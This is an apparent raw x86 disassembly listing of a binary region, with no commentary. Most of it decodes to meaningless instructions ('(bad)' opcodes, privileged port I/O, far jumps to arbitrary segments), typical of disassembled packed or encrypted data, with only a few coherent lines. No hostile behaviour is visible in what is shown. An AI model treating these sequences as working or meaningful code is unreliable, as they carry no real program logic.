  4104c6:	outs   dx,DWORD PTR ds:[esi]
  4104c7:	cdq    
  4104c8:	jnp    0x41051b
  4104ca:	xlat   BYTE PTR ds:[ebx]
  4104cb:	iret   
  4104cc:	push   0xeac97720
  4104d1:	les    esi,FWORD PTR [ecx+0x2a]
  4104d4:	xor    DWORD PTR [ebx],0x8da25f7d
  4104da:	adc    ebx,ebx
  4104dc:	test   al,0x30
  4104de:	inc    esi
  4104df:	and    edx,DWORD PTR [edx]
  4104e1:	dec    eax
  4104e2:	jg     0x410490
  4104e4:	outs   dx,DWORD PTR ds:[esi]
  4104e5:	(bad)  
  4104e6:	sub    al,0xdd
  4104e8:	iret   
  4104e9:	sub    ebx,DWORD PTR [ebp+0x62e2aed7]
  4104ef:	cmp    eax,0xbfa52a1
  4104f4:	iret   
  4104f5:	test   al,0x7d
  4104f7:	mov    al,ds:0x7918a6cd
  4104fc:	mov    ebx,0x39751ee0
  410501:	ja     0x410551
  410503:	fcmovb st,st(2)
  410505:	sti    
  410506:	scas   eax,DWORD PTR es:[edi]
  410507:	nop
  410508:	pop    ebp
  410509:	neg    ah
  41050b:	(bad)  
  41050c:	jmp    0x67b9:0x5fafe37a
  410513:	sar    BYTE PTR [ebp+0x5d],0x86
  410517:	xor    DWORD PTR [ebp+0x67e9a7a8],eax
  41051d:	fcomp  DWORD PTR [ecx-0xe]
  410520:	pop    ds
  410521:	push   edx
  410522:	dec    edx
  410523:	dec    DWORD PTR [ebp+0x7b]
  410526:	test   BYTE PTR [edi+0x7ef780d7],0x55
  41052d:	je     0x410536
  41052f:	outs   dx,DWORD PTR ds:[esi]
  410530:	cs mov ebp,0xda95d7f0
  410536:	sub    al,0xca
  410538:	sbb    dh,al
  41053a:	or     DWORD PTR [eax+0x4e],edi
  41053d:	loope  0x41056f
  41053f:	jae    0x410500
  410541:	mov    ah,BYTE PTR [ecx+ecx*4+0x3c58cc6d]
  410548:	inc    esp
  410549:	(bad)  
  41054a:	mov    ebx,0x60d5dd28
  41054f:	push   eax
  410550:	int3   
  410551:	xor    BYTE PTR [edx-0x2f9d757e],bh
  410557:	push   0x34
  410559:	ret    
  41055a:	rcr    BYTE PTR [ecx+0x7bd4972e],cl
  410560:	ror    DWORD PTR [esi+ebx*1],1
  410563:	fadd   QWORD PTR [edi-0x67ade246]
  410569:	out    dx,eax
  41056a:	adc    eax,DWORD PTR [esi]
  41056c:	in     eax,dx
  41056d:	adc    eax,0xf20a686e
  410572:	xor    BYTE PTR [ebp+eax*2+0x45220ec9],bh
  410579:	cmc    
  41057a:	xchg   ebx,ebx
  41057c:	lods   eax,DWORD PTR ds:[esi]
  41057d:	fsubr  DWORD PTR ds:0xbffb726a
  410583:	iret   
  410584:	jo     0x41058c
  410586:	shr    BYTE PTR [ebx+edx*1-0x3cba39c9],0x2f
  41058e:	mov    ebx,0xc0662728
  410593:	mov    bh,0xed
  410595:	in     al,0x5d
  410597:	sbb    BYTE PTR ds:0xd299e922,0xd8
  41059e:	in     al,0x5f
  4105a0:	jne    0x410543
  4105a2:	sbb    cl,BYTE PTR [eax]
  4105a4:	ja     0x4105cd
  4105a6:	mov    bl,BYTE PTR [ecx-0x35]
  4105a9:	int3   
  4105aa:	mov    al,0xb7
  4105ac:	add    eax,0x1209f508
  4105b2:	popf   
  4105b3:	fidivr WORD PTR [edx]
  4105b5:	faddp  st(5),st
  4105b7:	sub    al,0xdb
  4105b9:	dec    eax
  4105ba:	stos   DWORD PTR es:[edi],eax
  4105bb:	ret    
  4105bc:	cmp    DWORD PTR [ebp-0x3a176405],edi
  4105c2:	outs   dx,BYTE PTR ds:[esi]
  4105c3:	push   ss
  4105c4:	pusha  
  4105c5:	aaa    
  4105c6:	lods   eax,DWORD PTR ds:[esi]
  4105c7:	ja     0x410627
  4105c9:	push   0x5ce0e324
  4105ce:	clc    
  4105cf:	pshufw mm7,mm3,0x15
  4105d3:	in     eax,0xb6
  4105d5:	shl    BYTE PTR [ecx+0x33819a39],0xd8
  4105dc:	xchg   esi,eax
  4105dd:	jb     0x410641
  4105df:	mov    al,ds:0x62d7c3a0
  4105e4:	test   al,0x31
  4105e6:	into   
  4105e7:	xor    DWORD PTR [edx+0x39f5056c],edi
  4105ed:	push   ecx
  4105ee:	push   eax
  4105ef:	and    BYTE PTR [edi],cl
  4105f1:	sbb    DWORD PTR [esi+eiz*4+0x13],edi
  4105f5:	and    BYTE PTR [edi+eax*1-0x10],dl
  4105f9:	aad    0xe6
  4105fb:	jbe    0x410662
  4105fd:	call   0x4919:0xb513dae
  410604:	out    0xa,eax
  410606:	stos   DWORD PTR es:[edi],eax
  410607:	mov    ebx,0x369f21e9
  41060c:	aas    
  41060d:	(bad)  
  41060e:	push   edx
  41060f:	jecxz  0x41066e
  410611:	jle    0x4105fc
  410613:	sbb    ah,dh
  410615:	addr16 loopne 0x410619
  410618:	mov    esi,0x18a2d9c4
  41061d:	js     0x410684
  41061f:	sub    eax,0x28dfc0a6
  410624:	ror    DWORD PTR [ebx],cl
  410626:	mov    edx,0x65783371
  41062b:	mov    WORD PTR [edx+0x55328b74],es
  410631:	and    al,0x22
  410633:	sti    
  410634:	xor    eax,DWORD PTR [ebx+edi*8+0x3394a737]
  41063b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41063c:	xor    DWORD PTR [edx+0x27],edi
  41063f:	repnz add al,dl
  410642:	repnz mov ds:0x9ff8bff3,eax
  410648:	mov    cs,WORD PTR [eax]
  41064a:	jae    0x410636
  41064c:	dec    eax
  41064d:	int3   
  41064e:	jg     0x410603
  410650:	jl     0x4106bf
  410652:	bound  edi,QWORD PTR [edx-0x5a]
  410655:	cmp    ch,bh
  410657:	dec    edi
  410658:	sti    
  410659:	xchg   bl,al
  41065b:	adc    DWORD PTR [ecx+edi*4-0x7f340db7],ecx
  410662:	sbb    bh,bl
  410664:	add    DWORD PTR [ebp-0x6d90d626],edx
  41066a:	fidivr DWORD PTR [eax-0x7c]
  41066d:	test   al,0xc2
  41066f:	int3   
  410670:	out    0xab,eax
  410672:	and    eax,0x679e244f
  410677:	sbb    al,0x6d
  410679:	add    DWORD PTR [edx-0x6],esi
  41067c:	inc    eax
  41067d:	(bad)  
  41067f:	test   DWORD PTR ds:0xae171455,ebp
  410685:	jecxz  0x410705
  410687:	retf   
  410688:	clc    
  410689:	cmp    BYTE PTR [ebx+0xa481ce5],bl
  41068f:	xchg   esp,eax
  410690:	cmp    DWORD PTR [eax-0x66],ecx
  410693:	xchg   dx,ax
  410695:	mov    BYTE PTR [ecx-0x2ff363e3],cl
  41069b:	mov    ecx,0xdfcf536b
  4106a0:	add    al,BYTE PTR [esi+0x1a]
  4106a3:	push   es
  4106a4:	repz mov WORD PTR [ecx+0x19],?
  4106a8:	sbb    al,0x7b
  4106aa:	cmp    esi,ecx
  4106ac:	and    DWORD PTR [esi],0xb439a6e5
  4106b2:	in     al,0x3b
  4106b4:	test   BYTE PTR [edx+ebp*2-0x76],bl
  4106b8:	adc    ah,BYTE PTR [edi-0x17195df6]
  4106be:	into   
  4106bf:	push   ss
  4106c0:	cmp    ah,ah
  4106c2:	(bad)  
  4106c3:	jno    0x410683
  4106c5:	or     dl,BYTE PTR [edi+edi*1]
  4106c8:	xor    al,BYTE PTR [ecx]
  4106ca:	add    DWORD PTR fs:[edx+0x4e],ecx
  4106ce:	mul    BYTE PTR [eax+0x4e]
  4106d1:	push   es
  4106d2:	mov    eax,ds:0x899036e3
  4106d7:	int    0xdf
  4106d9:	mov    ah,0xb1
  4106db:	jae    0x41068b
  4106dd:	call   0x4a0c:0xaeda7b17
  4106e4:	jmp    0x4106e4
  4106e6:	sbb    eax,0x7f444606
  4106eb:	inc    edi
  4106ec:	je     0x4106a8
  4106ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106ef:	dec    ecx
  4106f0:	enter  0xfedd,0x97
  4106f4:	xor    ah,BYTE PTR [eax]
  4106f6:	jl     0x410713
  4106f8:	imul   eax,edi,0xa9c62071
  4106fe:	dec    esp
  4106ff:	jmp    0x410713
  410701:	outs   dx,DWORD PTR ds:[si]
  410703:	es fwait
  410705:	add    BYTE PTR [esi+eiz*4+0x22d2a0ff],ah
  41070c:	and    eax,0xdc74ead7
  410711:	fst    QWORD PTR [edx]
  410713:	dec    esp
  410714:	mov    ebp,0xd723f636
  410719:	sub    bh,BYTE PTR ds:0xf5556be1
  41071f:	dec    edi
  410720:	mov    ds:0xafb0a803,al
  410725:	pop    ecx
  410726:	sahf   
  410727:	inc    ecx
  410728:	imul   BYTE PTR [edx]
  41072a:	add    al,BYTE PTR [ecx-0x5b3fbb0e]
  410730:	aam    0xb4
  410732:	sub    dl,BYTE PTR [ebx]
  410734:	jne    0x4106fc
  410736:	cld    
  410737:	add    bl,BYTE PTR cs:[esi+0x4c]
  41073b:	call   0x95c053b7
  410740:	push   esp
  410741:	sbb    bh,dl
  410743:	or     al,0x96
  410745:	ss ss and ah,cl
  410749:	add    DWORD PTR [edi*4+0x2b56aaf3],0x15a13f43
  410754:	aaa    
  410755:	scas   al,BYTE PTR es:[edi]
  410756:	mov    ah,0x98
  410758:	mov    eax,DWORD PTR [ebp-0xc]
  41075b:	inc    edx
  41075c:	cmp    edx,eax
  41075e:	jne    0x41045a
  410764:	pop    edi
  410765:	pop    ebx
  410766:	mov    eax,DWORD PTR [ebp-0x8]
  410769:	mov    edx,DWORD PTR [ebp+0x10]
  41076c:	xor    eax,ecx
  41076e:	jmp    0x410a3c
  410773:	mov    ds:0x6929ab51,eax
  410778:	icebp  
  410779:	mov    eax,ds:0x2251d751
  41077e:	and    eax,0xf672c28e
  410783:	or     eax,0xaf7e7ebf
  410788:	jl     0x410808
  41078a:	jle    0x4107b6
  41078c:	push   0xc
  41078e:	add    ebp,esp
  410790:	jle    0x4107f1
  410792:	iret   
  410793:	jb     0x41074f
  410795:	pop    eax
  410796:	mov    cl,0x1
  410798:	leave  
  410799:	ins    BYTE PTR es:[edi],dx
  41079a:	xchg   esp,eax
  41079b:	outs   dx,BYTE PTR ds:[esi]
  41079c:	iret   
  41079d:	mov    ebx,0x865ef4cd
  4107a2:	adc    al,0x4e
  4107a4:	pop    esp
  4107a5:	or     BYTE PTR [edi+ecx*4],dh
  4107a8:	retf   
  4107a9:	xchg   edi,eax
  4107aa:	jns    0x4107b6
  4107ac:	aam    0xc0
  4107ae:	mov    al,ds:0xe6dc950d
  4107b3:	mov    fs,WORD PTR [edx-0x35cccc46]
  4107b9:	sbb    eax,0xe7203dfa
  4107be:	mov    al,ds:0xc6b873c
  4107c3:	jo     0x41081d
  4107c5:	imul   eax,DWORD PTR [ebp-0x14e2d027],0xc
  4107cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107cd:	mov    BYTE PTR [edx-0x2e],dl
  4107d0:	sub    BYTE PTR [edx],ch
  4107d2:	sti    
  4107d3:	dec    esp
  4107d4:	popf   
  4107d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107d6:	mov    al,BYTE PTR [ecx+eiz*8-0x3ba74517]
  4107dd:	xchg   BYTE PTR [edx-0x229d6f6a],ch
  4107e3:	sbb    ah,BYTE PTR [ebx+0x6774d8a9]
  4107e9:	dec    ecx
  4107ea:	and    eax,0xffad4c0a
  4107ef:	mov    ecx,0x5ec06ce9
  4107f4:	mov    bh,0xf
  4107f6:	xor    BYTE PTR [edx-0x80],bl
  4107f9:	ret    0x4afa
  4107fc:	fnsave [edi-0x7f2c98cf]
  410802:	dec    DWORD PTR [ecx-0x47052672]
  410808:	xchg   esi,eax
  410809:	imul   BYTE PTR [eax+0x7b]
  41080c:	out    0xfc,eax
  41080e:	stc    
  41080f:	mov    dh,0xe6
  410811:	cli    
  410812:	les    esp,FWORD PTR [ecx]
  410814:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410815:	fs pop ebx
  410817:	(bad)  
  410818:	adc    ebp,DWORD PTR [ecx-0x51]
  41081b:	lgs    esi,FWORD PTR [esp+esi*1+0x3c]
  410820:	mov    BYTE PTR [ebx],bh
  410822:	cmp    bl,BYTE PTR [esi-0x40ddd7ac]
  410828:	js     0x4107c5
  41082a:	scas   al,BYTE PTR es:[edi]
  41082b:	nop
  41082c:	ins    DWORD PTR es:[edi],dx
  41082d:	stos   BYTE PTR es:[edi],al
  41082e:	mov    dh,0x48
  410830:	in     eax,dx
  410831:	call   0x3210:0xcca33ac1
  410838:	add    dl,0x3c
  41083b:	fisubr DWORD PTR [ebx+0xa]
  41083e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41083f:	mov    ah,0x5b
  410841:	sbb    DWORD PTR [ecx],0xe1224e50
  410847:	mov    BYTE PTR [esi+ebp*2+0x57a614de],al
  41084e:	pop    ss
  41084f:	push   ebp
  410850:	sub    ebx,DWORD PTR [edx+eiz*8]
  410853:	xor    al,0x7
  410855:	xchg   esi,eax
  410856:	loopne 0x410802
  410858:	add    BYTE PTR [ebp-0x5d246c99],bl
  41085e:	push   ecx
  41085f:	inc    ecx
  410860:	jp     0x410836
  410862:	pop    ss
  410863:	div    DWORD PTR [edx-0x6e]
  410866:	pushf  
  410867:	dec    esp
  410868:	test   eax,0x4aff19fb
  41086d:	dec    ebx
  41086e:	xchg   ebp,eax
  41086f:	pop    ecx
  410870:	in     eax,dx
  410871:	loop   0x41087f
  410873:	scas   eax,DWORD PTR es:[edi]
  410874:	in     al,dx
  410875:	inc    esi
  410876:	dec    edx
  410877:	(bad)  
  410878:	push   0x39557386
  41087d:	adc    DWORD PTR [edi-0x7a],esi
  410880:	mov    cl,0xca
  410882:	ins    BYTE PTR es:[edi],dx
  410883:	jo     0x410862
  410885:	cld    
  410886:	adc    DWORD PTR [edx-0x4a],esp
  410889:	in     al,dx
  41088a:	repz retf 0x11ef
  41088e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41088f:	int3   
  410890:	aam    0x1a
  410892:	dec    edx
  410893:	add    DWORD PTR [eax+0x4c],ebx
  410896:	clc    
  410897:	xlat   BYTE PTR ds:[ebx]
  410898:	inc    ebx
  410899:	cs dec edx
  41089b:	mov    al,ds:0xad8a48f9
  4108a0:	add    eax,0x7743fdfe
  4108a5:	mov    dh,0x67
  4108a7:	push   eax
  4108a8:	sbb    BYTE PTR [esi-0x6981dc71],bh
  4108ae:	xchg   esi,eax
  4108af:	xchg   ebx,ebx
  4108b1:	repz lock ror DWORD PTR [edx+ebx*1+0x29],1
  4108b7:	sbb    ebp,esi
  4108b9:	out    dx,eax
  4108ba:	jmp    0x410880
  4108bc:	xchg   esi,eax
  4108bd:	pop    es
  4108be:	add    BYTE PTR [edx+edi*8-0x26],ch
  4108c2:	adc    edi,ecx
  4108c4:	pushf  
  4108c5:	inc    esi
  4108c6:	dec    ecx
  4108c7:	add    eax,0x748e24d3
  4108cc:	ss and al,0xd7
  4108cf:	sub    BYTE PTR [eax+0x16],cl
  4108d2:	fisttp QWORD PTR [eax+0x3]
  4108d5:	in     al,dx
  4108d6:	mov    ecx,0x2a8d6509
  4108db:	lds    eax,FWORD PTR [eax+0xf89288f]
  4108e1:	cmp    DWORD PTR [eax+0x62e31c0d],edi
  4108e7:	pop    ds
  4108e8:	adc    DWORD PTR [edx-0x555a8b35],ecx
  4108ee:	jmp    0x41089a
  4108f0:	mov    cl,0xd4
  4108f2:	jecxz  0x410900
  4108f4:	les    esp,FWORD PTR [eax]
  4108f6:	lea    esp,[ebx-0x64]
  4108f9:	mov    BYTE PTR [ebp-0x7b34e29f],al
  4108ff:	jp     0x41096f
  410901:	cmp    DWORD PTR [eax+0x58],ebx
  410904:	adc    DWORD PTR [ecx-0x78],ebp
  410907:	and    dh,BYTE PTR [ecx+0x130fc0ff]
  41090d:	lahf   
  41090e:	jecxz  0x4108d3
  410910:	test   al,0x40
  410912:	test   al,0x2f
  410914:	inc    esp
  410915:	aam    0x43
  410917:	jmp    0x962e7021
  41091c:	xor    edx,DWORD PTR [edx]
  41091e:	jnp    0x4108ca
  410920:	(bad)  
  410921:	in     eax,dx
  410922:	inc    ebx
  410923:	repz jmp 0x22017ad1
  410929:	xor    BYTE PTR [esi+eiz*2],al
  41092c:	scas   al,BYTE PTR es:[edi]
  41092d:	inc    esp
  41092e:	rol    BYTE PTR [ebp+0x68],1
  410931:	cmc    
  410932:	fild   WORD PTR [ebx]
  410934:	ds jge 0x4108bf
  410937:	or     DWORD PTR [ecx+eax*2-0x3f],0xffffff96
  41093c:	xchg   esp,eax
  41093d:	scas   al,BYTE PTR es:[edi]
  41093e:	dec    edx
  41093f:	mov    ds:0xb032e4a3,eax
  410944:	das    
  410945:	or     cl,dl
  410947:	cmp    eax,0x95fc8fde
  41094c:	mov    WORD PTR [di],ss
  41094f:	mov    eax,0x9c743423
  410954:	(bad)  
  410955:	call   0x8fb6:0x6201a393
  41095c:	xlat   BYTE PTR ds:[ebx]
  41095d:	mov    cl,0xc9
  41095f:	mov    cl,0x90
  410961:	mov    dl,BYTE PTR [esp+eiz*4]
  410964:	out    dx,al
  410965:	iret   
  410966:	lahf   
  410967:	dec    ecx
  410968:	lds    eax,FWORD PTR [eax-0x74a225f3]
  41096e:	push   es
  41096f:	and    cl,cl
  410971:	adc    esi,DWORD PTR [edi-0x5b]
  410974:	int3   
  410975:	or     al,0x75
  410977:	add    al,0xbf
  410979:	dec    ecx
  41097a:	fs ins BYTE PTR es:[edi],dx
  41097c:	and    dh,bl
  41097e:	fsubr  DWORD PTR [edx+0x42a031be]
  410984:	push   edx
  410985:	in     al,dx
  410986:	hlt    
  410987:	std    
  410988:	les    esi,FWORD PTR [esp+ebp*4-0x3c356cbc]
  41098f:	add    eax,0x34e6da2b
  410994:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410995:	jae    0x4109a4
  410997:	test   al,0xf8
  410999:	adc    eax,eax
  41099b:	ficomp WORD PTR [ebx-0x73]
  41099e:	test   DWORD PTR [esi+ecx*4-0x25],0x5fd323dd
  4109a6:	mov    dl,0xa0
  4109a8:	xor    bh,BYTE PTR [ebx+edi*4+0x60]
  4109ac:	pop    ecx
  4109ad:	push   esi
  4109ae:	inc    edx
  4109af:	fwait
  4109b0:	enter  0x4fe1,0x53
  4109b4:	fnstsw WORD PTR [si-0x2d]
  4109b8:	add    ebx,DWORD PTR [edx-0x1daed8a7]
  4109be:	mov    ebp,0xa1ccb33f
  4109c3:	out    0x25,eax
  4109c5:	imul   BYTE PTR [eax]
  4109c7:	pop    edi
  4109c8:	xchg   edi,eax
  4109c9:	stos   BYTE PTR es:[edi],al
  4109ca:	adc    dh,BYTE PTR [esi+0x4b]
  4109cd:	pop    edx
  4109ce:	into   
  4109cf:	cmp    BYTE PTR [ebx+0x1d],dh
  4109d2:	repnz inc edx
  4109d4:	call   0x3ce4d45a
  4109d9:	sahf   
  4109da:	(bad)  
  4109db:	lods   al,BYTE PTR ds:[esi]
  4109dc:	push   esi
  4109dd:	fs in  al,dx
  4109df:	lods   eax,DWORD PTR ds:[esi]
  4109e0:	lods   eax,DWORD PTR ds:[esi]
  4109e1:	shr    BYTE PTR [eax+esi*2-0x4d],0xb6
  4109e6:	popa   
  4109e7:	nop
  4109e8:	aas    
  4109e9:	sub    eax,0xd8c0fb
  4109ee:	xor    eax,0xb1b2adb6
  4109f3:	dec    esp
  4109f4:	lock shr DWORD PTR [edi+0x2a],1
  4109f8:	xor    eax,0xbee26666
  4109fd:	imul   ecx,DWORD PTR [edi+0x24482465],0x49d2b79e
  410a07:	pop    ebp
  410a08:	inc    edi
  410a09:	mov    eax,ds:0x8409ec19
  410a0e:	dec    edi
  410a0f:	push   ecx
  410a10:	cwde   
  410a11:	das    
  410a12:	xlat   BYTE PTR ds:[ebx]
  410a13:	push   eax
  410a14:	push   edi
  410a15:	adc    DWORD PTR [ecx],0x5c
  410a18:	sub    eax,0x997626cb
  410a1d:	push   ebx
  410a1e:	jp     0x410a6b
  410a20:	(bad)  
  410a21:	dec    ebp
  410a22:	ins    DWORD PTR es:[edi],dx
  410a23:	sti    
  410a24:	adc    BYTE PTR [edx-0x78],bh
  410a27:	mov    ds,WORD PTR [ecx-0x27]
  410a2a:	mov    esi,0x3c31dfe
  410a2f:	aad    0x5e
  410a31:	sub    eax,DWORD PTR [ecx-0x52]
  410a34:	popf   
  410a35:	xchg   DWORD PTR [eax-0x61],ebp
  410a38:	sub    dl,BYTE PTR [eax-0x39fcf647]
  410a3e:	jmp    0x410d0c
  410a43:	add    dh,BYTE PTR [edx]
  410a45:	fdiv   QWORD PTR fs:[eax+ebp*2-0x7e]
  410a4a:	lock pop eax
  410a4c:	(bad)  
  410a4d:	xchg   esp,eax
  410a4e:	pop    esi
  410a4f:	repz jno 0x410a24
  410a52:	jl     0x410a0e
  410a54:	mov    ebp,0x7caf7e7e
  410a59:	jle    0x410ad9
  410a5b:	dec    ebx
  410a5c:	push   edx
  410a5d:	xchg   edx,eax
  410a5e:	xchg   edi,eax
  410a5f:	lods   eax,DWORD PTR ds:[esi]
  410a60:	push   0xfffffff2
  410a62:	dec    eax
  410a63:	push   esi
  410a64:	mov    ebx,0x101a47cb
  410a69:	(bad)  
  410a6a:	aad    0x7f
  410a6c:	stc    
  410a6d:	dec    ebp
  410a6e:	sub    bh,BYTE PTR [ecx]
  410a70:	scas   eax,DWORD PTR es:[edi]
  410a71:	shr    DWORD PTR [ecx-0x6f85ecba],1
  410a77:	test   al,0xd7
  410a79:	test   DWORD PTR [ebp+0x584e1a2e],ebp
  410a7f:	adc    esi,DWORD PTR ds:0x10414479
  410a85:	ds xchg ecx,eax
  410a87:	inc    edi
  410a88:	xor    eax,0xf64cd126
  410a8d:	and    DWORD PTR [eax-0x59704289],ecx
  410a93:	or     al,0x0
  410a95:	out    dx,al
  410a96:	inc    esi
  410a97:	fidivr WORD PTR [eiz*1-0x4bf4a501]
  410a9e:	dec    esi
  410a9f:	inc    ecx
  410aa0:	add    BYTE PTR [ecx-0x26],0x1
  410aa4:	xor    al,0xc8
  410aa6:	call   0xebf07ca1
  410aab:	cmp    BYTE PTR [ecx],0x84
  410aae:	mov    al,0xc7
  410ab0:	pop    eax
  410ab1:	popa   
  410ab2:	lahf   
  410ab3:	mov    esi,0xcb1de470
  410ab8:	mov    ds:0x8276d299,al
  410abd:	daa    
  410abe:	jnp    0x410ac0
  410ac0:	push   ebp
  410ac1:	jp     0x410b0b
  410ac3:	dec    ebx
  410ac4:	or     DWORD PTR [ecx+0x452f0aac],0xffffffeb
  410acb:	xor    BYTE PTR [edi],0xf4
  410ace:	dec    ecx
  410acf:	outs   dx,BYTE PTR ds:[esi]
  410ad0:	adc    BYTE PTR [esi],cl
  410ad2:	adc    al,0xd0
  410ad4:	call   0x436b:0x9b4e39f9
  410adb:	xchg   edi,eax
  410adc:	fistp  WORD PTR [ecx-0x6d]
  410adf:	add    esp,ebp
  410ae1:	fs out 0x52,al
  410ae4:	pop    ds
  410ae5:	dec    ebp
  410ae6:	push   eax
  410ae7:	call   0xac80:0xbff120ed
  410aee:	sti    
  410aef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410af0:	cmp    dl,dh
  410af2:	mov    ch,0x9d
  410af4:	xchg   esp,eax
  410af5:	or     dh,BYTE PTR [ecx]
  410af7:	fld    DWORD PTR [ebp+0x6]
  410afa:	mov    ah,0xa3
  410afc:	jo     0x410b54
  410afe:	mov    ecx,0x8189a2f
  410b03:	(bad)  
  410b04:	out    dx,eax
  410b05:	bound  edi,QWORD PTR [edx-0x53ff8589]
  410b0b:	inc    DWORD PTR [eax]
  410b0d:	add    BYTE PTR [esi-0x61],0xf5
  410b11:	cdq    
  410b12:	or     DWORD PTR [esi],ebp
  410b14:	mov    ebp,0x6c7ec4a6
  410b19:	cli    
  410b1a:	fst    QWORD PTR [ebp+0x49d44381]
  410b20:	adc    BYTE PTR [edx],ah
  410b22:	aad    0xe4
  410b24:	add    DWORD PTR [esi-0x67],edx
  410b27:	xor    edi,DWORD PTR [esi+ebp*8+0x4f62b696]
  410b2e:	out    dx,al
  410b2f:	out    0xce,al
  410b31:	jnp    0x410b31
  410b33:	sbb    eax,0x908fc10c
  410b38:	pop    ss
  410b39:	(bad)  
  410b3b:	lods   al,BYTE PTR ds:[esi]
  410b3c:	mov    bl,0x61
  410b3e:	fs gs mov eax,0x7e1c8ce7
  410b45:	or     BYTE PTR [edx],bl
  410b47:	out    0x15,al
  410b49:	shr    DWORD PTR [edi-0x2],0xb5
  410b4d:	add    esi,DWORD PTR [eax-0x1f]
  410b50:	dec    ebx
  410b51:	retf   
  410b52:	ret    0x3bbe
  410b55:	add    bl,BYTE PTR [esi+esi*2+0x1398d9b0]
  410b5c:	aam    0x4d
  410b5e:	out    0xb,al
  410b60:	add    DWORD PTR [eax+ecx*4],edx
  410b63:	push   eax
  410b64:	and    ebx,edi
  410b66:	pop    esi
  410b67:	mov    ch,0x5
  410b69:	pop    eax
  410b6a:	xchg   edx,eax
  410b6b:	push   ecx
  410b6c:	adc    eax,DWORD PTR [edx]
  410b6e:	sahf   
  410b6f:	(bad)  
  410b71:	mov    bh,0x6e
  410b73:	mov    dl,0xc4
  410b75:	push   ecx
  410b76:	inc    esi
  410b77:	xchg   esi,eax
  410b78:	jmp    0x98d0:0x9a76e5f2
  410b7f:	(bad)  
  410b81:	outs   dx,BYTE PTR ds:[esi]
  410b82:	sub    bh,BYTE PTR [ecx]
  410b84:	mov    esp,DWORD PTR [edi]
  410b86:	hlt    
  410b87:	inc    ebx
  410b88:	repz cli 
  410b8a:	and    al,BYTE PTR [ecx-0x79]
  410b8d:	xchg   ebp,eax
  410b8e:	mov    al,BYTE PTR [eax+0x69687191]
  410b94:	sub    eax,0xacbdc13a
  410b99:	addr16 into 
  410b9b:	pop    edx
  410b9c:	mov    bl,0x25
  410b9e:	mov    dh,0x7d
  410ba0:	jnp    0x410b5d
  410ba2:	mov    eax,ds:0xebc3e239
  410ba7:	mov    BYTE PTR [ebx-0x63],al
  410baa:	test   eax,0x5dace114
  410baf:	dec    edx
  410bb0:	ins    BYTE PTR es:[edi],dx
  410bb1:	inc    edi
  410bb2:	cld    
  410bb3:	xor    edi,ecx
  410bb5:	xlat   BYTE PTR ds:[ebx]
  410bb6:	pop    esp
  410bb7:	fiadd  WORD PTR [ebx+0x27]
  410bba:	ficom  DWORD PTR ds:0xcfe4d89
  410bc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bc1:	sti    
  410bc2:	popf   
  410bc3:	mov    eax,ds:0x4927bd30
  410bc8:	leave  
  410bc9:	stc    
  410bca:	jae    0x410c02
  410bcc:	pop    es
  410bcd:	imul   BYTE PTR [eax]
  410bcf:	jbe    0x410b5a
  410bd1:	retf   
  410bd2:	aas    
  410bd3:	dec    eax
  410bd4:	push   0xc411736f
  410bd9:	scas   eax,DWORD PTR es:[edi]
  410bda:	adc    DWORD PTR ds:0x5ab1f701,ebp
  410be0:	ret    0xddd5
  410be3:	inc    ebp
  410be4:	mov    cl,dl
  410be6:	std    
  410be7:	(bad)  
  410be8:	loop   0x410be4
  410bea:	sti    
  410beb:	cdq    
  410bec:	popa   
  410bed:	imul   BYTE PTR [edx-0xbc76f9b]
  410bf3:	stos   BYTE PTR es:[edi],al
  410bf4:	fcomp  DWORD PTR ds:0xe79e2b5
  410bfa:	ins    DWORD PTR es:[edi],dx
  410bfb:	ja     0x410bd8
  410bfd:	sub    BYTE PTR [ecx-0x2d],bh
  410c00:	mov    ebp,0x731f0e07
  410c05:	cwde   
  410c06:	push   ebp
  410c07:	leave  
  410c08:	cmp    al,BYTE PTR [edx+ecx*4]
  410c0b:	pop    eax
  410c0c:	lods   al,BYTE PTR ds:[esi]
  410c0d:	mov    ebx,DWORD PTR [edi+0x61f34b0b]
  410c13:	mov    al,ds:0xc557a5c3
  410c18:	mov    ch,0x17
  410c1a:	lea    ecx,ds:0xa18174f9
  410c20:	jno    0x410bc7
  410c22:	mov    fs,WORD PTR [edx]
  410c24:	sahf   
  410c25:	jb     0x410c33
  410c27:	lea    esi,[ebp+0x20]
  410c2a:	jmp    0x8c73:0x807e05ec
  410c31:	xchg   esi,eax
  410c32:	add    esi,DWORD PTR [edi-0x7788db67]
  410c38:	push   ebx
  410c39:	jecxz  0x410c3f
  410c3b:	data16 mov bh,0xe2
  410c3e:	inc    ecx
  410c3f:	push   ebp
  410c40:	mov    ah,0x27
  410c42:	jl     0x410cb8
  410c44:	out    dx,eax
  410c45:	jmp    0x410ca2
  410c47:	shl    DWORD PTR [edi],0xf8
  410c4a:	mov    ch,0x44
  410c4c:	fwait
  410c4d:	pop    esp
  410c4e:	out    0x87,al
  410c50:	sub    bl,bl
  410c52:	push   ebx
  410c53:	adc    BYTE PTR [ecx-0x47],dl
  410c56:	sbb    eax,0xaba865cd
  410c5b:	out    dx,al
  410c5c:	dec    ebx
  410c5d:	pop    ecx
  410c5e:	jl     0x410bec
  410c60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c61:	mov    esi,0xef4a3efa
  410c66:	mov    edi,0x73e7c21f
  410c6b:	pop    es
  410c6c:	xlat   BYTE PTR ds:[ebx]
  410c6d:	ins    BYTE PTR es:[edi],dx
  410c6e:	dec    edx
  410c6f:	inc    edx
  410c70:	dec    edx
  410c71:	scas   eax,DWORD PTR es:[edi]
  410c72:	or     eax,0xcc3513b2
  410c77:	leave  
  410c78:	and    eax,esp
  410c7a:	pop    ss
  410c7b:	mov    al,0xc6
  410c7d:	mov    esp,0xfe487f27
  410c82:	adc    eax,0x5ee8c153
  410c87:	xchg   esi,eax
  410c88:	pop    ebx
  410c89:	mov    dl,BYTE PTR [edx+0x28f49538]
